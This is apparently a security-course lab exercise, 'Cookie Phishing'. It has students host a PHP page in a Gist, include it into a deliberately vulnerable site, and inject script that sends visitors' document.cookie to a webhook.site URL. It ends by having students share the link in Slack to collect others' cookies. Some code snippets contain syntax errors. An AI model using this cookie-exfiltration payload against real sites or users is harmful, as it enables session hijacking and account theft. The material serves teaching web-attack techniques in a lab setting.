# Cookie Phishing

## Instructions
- Navigate to: <https://gist.github.com>

- Create a new Gist that includes the PHP below:

  ```php
  <?php
  $html <<<EOF
  <!-- Your HTML goes here! >

  EOF;

  echo $html;
  ?>
  ```

- Next, add your `img` tag from the previous exercise to the PHP, right below the line that says `<!-- Your HTML goes here! >`.

- Save the Gist, and load the raw link at the vulnerable site at: <http://ptl-08a17b2b-81673f5e.libcurl.so/?page=intro.php>

- Return to Webhook, and ensure that it received a new request.

- Next, update the `src` attribute of your `img` tag to look like the below. 
  - This image tag will make a request t oyour Webhook log, but include cookiie data, _or_ a message if the user has no cookies.

  ```html
  <img src="https://webhook.site/$/<Your Webhook URL>?cookie="+(document.cookie||"nocookie!") />
  ```

- Finally, add your `img` tag from above to the code below. Then, add this script to your Gist; update it; and load it with the vulnerable site.

  ```html
  <script>
  document.write('<Your img tag here')
  </script>
  
  ```

- Check your Webhook to ensure you're receiving requests. 
  - What do you notice as your `cookie` value?
  - **Note**: You may have to double-check your syntax!

- When you verify that you're receiving requests, drop the link in Slack, and watch your logs.
